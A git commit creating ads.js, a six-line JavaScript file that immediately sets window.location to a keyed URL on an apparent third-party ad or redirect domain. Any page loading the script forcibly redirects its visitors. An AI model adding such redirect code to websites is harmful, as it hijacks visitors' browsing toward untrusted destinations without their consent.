fdf932a43a8fb9f1e468e112f0c22b72e0e82a05
Lara Johns <80411308+jarollellhel@users.noreply.github.com>
2022-01-20 12:38:04 +0800

    Create ads.js

---
+++ ads.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+
+  'https://inquiryclank.com/pgy7h6cw?key=756a1bbb1d4d12b56cb50d97b90b7a51'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
